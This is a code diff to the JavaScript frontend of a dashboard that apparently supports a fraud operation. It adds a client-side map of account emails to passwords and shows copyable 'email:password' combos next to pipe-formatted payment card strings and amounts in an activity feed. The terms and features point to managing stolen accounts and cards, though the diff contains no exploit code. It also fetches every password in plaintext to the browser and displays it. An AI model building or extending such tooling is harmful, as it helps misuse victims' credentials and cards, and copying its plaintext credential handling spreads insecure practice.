@@ -808,12 +808,23 @@ function _renderActOpsChips() {
   }).join('');
   wrap.innerHTML = all + chips;
 }
-// Helper: resuelve email -> "email:password" combo desde state.rows (cache).
-// Si la cuenta no está en cache (filtrada/no cargada), devuelve solo el email.
+// Mapa global email→password para resolver combos fuera de state.rows
+let _emailPassMap = {};
+async function _loadPassMap() {
+  try {
+    const r = await fetch('/api/accounts/pass-map');
+    if (r.ok) _emailPassMap = await r.json();
+  } catch (_) {}
+}
+
+// Helper: resuelve email -> "email:password".
+// Busca en state.rows (más fresco) y cae en _emailPassMap como fallback.
 function _resolveComboFromEmail(email) {
   if (!email) return '';
   const row = (state.rows || []).find(r => r.email === email);
-  return row ? `${row.email}:${row.password || ''}` : email;
+  if (row?.password) return `${row.email}:${row.password}`;
+  const pwd = _emailPassMap[email];
+  return pwd ? `${email}:${pwd}` : email;
 }
 
 function renderActivity() {
@@ -843,7 +854,7 @@ function renderActivity() {
       </td>
       <td><span class="act-who" data-who="${esc(e.who ?? '')}">${esc(e.who ?? '—')}</span></td>
       <td>${actionLabel(e.kind)}</td>
-      <td class="combo"><b class="act-target d-copy" data-email="${esc(e.target || '')}" data-copy="${esc(_resolveComboFromEmail(e.target))}" title="Click para copiar combo">${esc(e.target || '—')}</b></td>
+      <td class="combo"><b class="act-target d-copy" data-email="${esc(e.target || '')}" data-copy="${esc(_resolveComboFromEmail(e.target))}" title="Click para copiar combo">${esc(_resolveComboFromEmail(e.target) || '—')}</b></td>
       <td class="combo">${e.card_pipe ? `<b class="d-copy mono" data-copy="${esc(e.card_pipe)}" title="Click para copiar tarjeta">${esc(e.card_pipe)}</b>` : '<span class="dim">—</span>'}</td>
       <td class="num">${e.amount != null ? fmtMoney(e.amount) : ''}</td>
       <td>${statusPill(e)}</td>
@@ -1274,7 +1285,7 @@ async function refreshKpis() {
           return `<div class="lp-feed-row ${rowCls} lp-feed-clickable" data-nav="activity" title="Click para ir al panel de Actividad">
             <span class="lp-feed-ic">${ic}</span>
             <span class="lp-feed-who lp-color-${esc(col)}">${esc(e.who || '—')}</span>
-            <span class="lp-feed-target dim mono d-copy" data-copy="${esc(combo)}" title="Click para copiar combo">${esc(e.target || '')}</span>
+            <span class="lp-feed-target dim mono d-copy" data-copy="${esc(combo)}" title="Click para copiar combo">${esc(combo || e.target || '')}</span>
             ${e.amount != null ? `<span class="lp-feed-amt mono">${fmtMoney(e.amount)}</span>` : ''}
             <span class="lp-feed-time mono dim">${fmtAgo(e.ts)}</span>
           </div>`;
@@ -3776,6 +3787,7 @@ $$('.ico-btn[title="Salir"], .power').forEach(btn => {
   tickFrase();
   setInterval(tickFrase, 9_000);
   await reload();
+  _loadPassMap();
   refreshKpis();
   setInterval(refreshKpis, 30_000);
   loadHealth(false);
